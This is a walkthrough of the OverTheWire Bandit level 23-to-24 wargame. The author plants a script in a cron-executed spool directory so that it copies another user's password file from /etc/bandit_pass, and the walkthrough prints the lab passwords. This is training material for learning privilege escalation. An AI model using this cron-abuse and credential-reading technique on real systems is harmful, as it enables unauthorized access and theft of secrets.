# level23 -> level24


[http://http://overthewire.org/wargames/bandit/bandit24.html](http://http://overthewire.org/wargames/bandit/bandit24.html)

-

    ssh bandit23@bandit.labs.overthewire.org

-

    bandit23@bandit.labs.overthewire.org's password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n


-
    bandit23@melinda:/tmp/sliitwar23$ cd /etc/cron.d/

    bandit23@melinda:/etc/cron.d$ ls -la

-

    total 100
    drwxr-xr-x   2 root root 4096 May  3 12:32 .
    drwxr-xr-x 108 root root 4096 May 27 11:11 ..
    -rw-r--r--   1 root root  102 Feb  9  2013 .placeholder
    -r--r-----   1 root root   46 Nov 14  2014 behemoth4_cleanup
    -rw-r--r--   1 root root  355 May 25  2013 cron-apt
    -rw-r--r--   1 root root   61 Nov 14  2014 cronjob_bandit22
    -rw-r--r--   1 root root   62 Nov 14  2014 cronjob_bandit23
    -rw-r--r--   1 root root   61 May  3 12:32 cronjob_bandit24
    -rw-r--r--   1 root root   62 May  3 12:32 cronjob_bandit24_root
    -r--r-----   1 root root   47 Nov 14  2014 leviathan5_cleanup
    -rw-------   1 root root  233 Nov 14  2014 manpage3_resetpw_job
    -rw-r--r--   1 root root   51 Nov 14  2014 melinda-stats
    -rw-r--r--   1 root root   54 Nov 14  2014 natas-session-toucher
    -rw-r--r--   1 root root   49 Nov 15  2014 natas-stats
    -r--r-----   1 root root   47 Nov 14  2014 natas25_cleanup
    -r--r-----   1 root root   47 Nov 14  2014 natas26_cleanup
    -r--r-----   1 root root   43 Nov 15  2014 natas27_cleanup
    -rw-r--r--   1 root root  510 Oct 29  2014 php5
    -rw-r--r--   1 root root   58 Nov 14  2014 semtex0-32
    -rw-r--r--   1 root root   58 Nov 14  2014 semtex0-64
    -rw-r--r--   1 root root   59 Nov 14  2014 semtex0-ppc
    -rw-r--r--   1 root root   35 Nov 14  2014 semtex5
    -rw-r--r--   1 root root  396 Nov 10  2013 sysstat
    -rw-r--r--   1 root root   29 Nov 14  2014 vortex0
    -rw-r--r--   1 root root   30 Nov 14  2014 vortex20

-

    bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24

-

    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

-
    
    bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh

-

    #!/bin/bash
    
    myname=$(whoami)
    
    cd /var/spool/$myname
    echo "Executing and deleting all scripts in /var/spool/$myname:"
    for i in * .*;
    do
    if [ "$i" != "." -a "$i" != ".." ];
    then
    echo "Handling $i"
    timeout -s 9 60 "./$i"
    rm -f "./$i"
    fi
    done


-

Creating the bash script (.sh)

      bandit23@melinda:$ cd tmp

-

      bandit23@melinda:/tmp$ mkdir sliitwar23

-

    bandit23@melinda:/tmp/sliitwar23$ cd sliitwar23

-

    bandit23@melinda:/tmp/sliitwar23$ nano jump23.sh

-

    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/sliitwar23/pass.txt


`Ctrl+X` to exit press `Y` to save

    
-

    bandit23@melinda:/tmp/sliitwar23$ chmod 777 jump23.sh
    
-


    bandit23@melinda:/tmp/sliitwar23$ cp jump23.sh /var/spool/bandit24

-


Now wait for a 1 Min - for the cron to run

-
 
    bandit23@melinda:/tmp/sliitwar23$ ls /var/spool/bandit24

-

    jump23.sh

-

    bandit23@melinda:/tmp/sliitwar23$ ls /var/spool/bandit24

-


    bandit23@melinda:/tmp/sliitwar23$ ls

-

    jump23.sh  pass.txt

-

    bandit23@melinda:/tmp/sliitwar23$ cat pass.txt

-

    UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

-


![](http://i.imgur.com/z79COrb.png)

![](http://i.imgur.com/hP9RBkh.png)




    